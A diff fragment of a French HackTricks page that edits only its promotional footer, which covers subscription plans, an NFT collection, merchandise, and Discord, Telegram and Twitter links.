-* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
